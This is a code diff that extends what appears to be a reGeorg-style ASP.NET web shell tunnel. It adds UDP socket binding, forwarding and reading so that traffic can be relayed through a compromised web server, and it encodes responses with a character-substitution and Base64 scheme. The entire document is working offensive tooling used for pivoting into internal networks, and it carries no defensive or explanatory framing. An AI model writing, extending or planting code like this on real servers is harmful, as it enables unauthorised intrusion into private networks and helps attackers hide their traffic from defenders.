@@ -208,6 +208,34 @@ if (cmd != null) {
             rinfo[STATUS] = "FAIL";
             rinfo[ERROR] = ex.Message;
         }
+    } else if (cmd == "UDP") {
+        try {
+            String target = (String) info[IP];
+            int port = int.Parse((String) info[PORT]);
+            IPAddress ip;
+            try {
+                ip = IPAddress.Parse(target);
+            } catch (Exception ex) {
+                IPHostEntry host = Dns.GetHostByName(target);
+                ip = host.AddressList[0];
+            }
+            System.Net.IPEndPoint localEP = new IPEndPoint(ip, port);
+            Socket relay = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
+
+            try {
+                relay.Bind(localEP);
+                relay.Blocking = false;
+                Application.Add(mark, relay);
+                rinfo[STATUS] = "OK";
+                rinfo[DATA] = ((IPEndPoint)relay.LocalEndPoint).Address.ToString() + ":" + ((IPEndPoint)relay.LocalEndPoint).Port.ToString();
+            } catch (Exception ex) {
+                rinfo[STATUS] = "FAIL";
+                rinfo[ERROR] = ex.Message;
+            }
+        } catch (Exception ex) {
+            rinfo[STATUS] = "FAIL";
+            rinfo[ERROR] = ex.Message;
+        }
     } else if (cmd == "DISCONNECT") {
         try {
             Socket s = (Socket)Application[mark];
@@ -215,8 +243,9 @@ if (cmd != null) {
         } catch (Exception ex){
         }
         Application.Remove(mark);
-        } else if (cmd == "FORWARD") {
-            Socket s = (Socket)Application[mark];
+    } else if (cmd == "FORWARD") {
+        Socket s = (Socket)Application[mark];
+        if (s.ProtocolType == ProtocolType.Tcp) {
             try {
                 s.Send((byte[]) info[DATA]);
                 rinfo[STATUS] = "OK";
@@ -224,9 +253,26 @@ if (cmd != null) {
                 rinfo[STATUS] = "FAIL";
                 rinfo[ERROR] = ex.Message;
             }
-        } else if (cmd == "READ") {
+        }
+        else if (s.ProtocolType == ProtocolType.Udp) {
             try {
-                Socket s = (Socket)Application[mark];
+                String target = (String) info[IP];
+                int port = int.Parse((String) info[PORT]);
+                IPAddress ip = IPAddress.Parse(target);
+                System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
+                
+                s.SendTo((byte[]) info[DATA], remoteEP);
+                rinfo[STATUS] = "OK";
+            } catch (Exception ex) {
+                rinfo[STATUS] = "FAIL";
+                rinfo[ERROR] = ex.Message;
+            }
+        }
+        
+    } else if (cmd == "READ") {
+        Socket s = (Socket)Application[mark];
+        if (s.ProtocolType == ProtocolType.Tcp) {
+            try {
                 int maxRead = MAXREADSIZE;
                 int readbuflen = READBUF;
                 int readLen = 0;
@@ -253,8 +299,41 @@ if (cmd != null) {
                 rinfo[STATUS] = "FAIL";
                 rinfo[ERROR] = ex.Message;
             }
+        } else if (s.ProtocolType == ProtocolType.Udp) {
+            try {
+                int maxRead = MAXREADSIZE;
+                int readbuflen = READBUF;
+                int readLen = 0;
+                byte[] readBuff = new byte[readbuflen];
+                MemoryStream readData = new MemoryStream();
+                try {
+                    EndPoint remoteEP = (EndPoint) new IPEndPoint(IPAddress.Any, 0);
+                    int c = s.ReceiveFrom(readBuff, ref remoteEP);
+                    while (c > 0) {
+                        byte[] newBuff = new byte[c];
+                        System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);
+                        string b64 = Convert.ToBase64String(newBuff);
+                        readData.Write(newBuff, 0, c);
+                        readLen += c;
+                        if (c < readbuflen || readLen >= maxRead)
+                            break;
+                        c = s.ReceiveFrom(readBuff, ref remoteEP);
+                    }
+                    var address = remoteEP.ToString().Split(':');
+                    rinfo[IP] = address[0]; 
+                    rinfo[PORT] = address[1];
+                    rinfo[DATA] = readData.ToArray();
+                    rinfo[STATUS] = "OK";
+                } catch (SocketException ex) {
+                    rinfo[STATUS] = "OK";
+                }
+            } catch (Exception ex) {
+                rinfo[STATUS] = "FAIL";
+                rinfo[ERROR] = ex.Message;
+            }
         }
-        Response.Write(StrTr(Convert.ToBase64String(blv_encode(rinfo)), en, de));
+    }
+    Response.Write(StrTr(Convert.ToBase64String(blv_encode(rinfo)), en, de));
     } else {
         Response.Write(Encoding.Default.GetString(Convert.FromBase64String(StrTr(GeorgHello, de, en))));
     }
